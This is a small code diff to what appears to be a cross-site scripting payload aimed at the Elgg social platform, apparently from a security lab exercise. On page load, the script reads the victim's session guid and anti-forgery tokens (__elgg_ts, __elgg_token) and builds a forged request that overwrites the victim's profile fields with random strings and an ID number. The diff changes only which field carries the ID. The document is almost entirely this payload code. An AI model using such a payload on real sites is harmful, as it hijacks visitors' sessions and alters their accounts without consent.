@@ -11,8 +11,8 @@ window.onload = function () {
     var guid = "&guid="+elgg.session.user.guid;
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    var briefDesc = "&briefdescription=1605011"+"&accesslevel[briefdescription]=1";
-    var description = "&description="+randomString(10)+"&accesslevel[description]=1";
+    var briefDesc = "&briefdescription="+randomString(10)+"&accesslevel[briefdescription]=1";
+    var description = "&description="+1605011+"&accesslevel[description]=1";
     var contactemail = "&contactemail="+randomString(10)+"&accesslevel[contactemail]=1";
     var interests = "&interests="+randomString(10)+"&accesslevel[interests]=1";
     var location = "&location="+randomString(10)+"&accesslevel[location]=1";
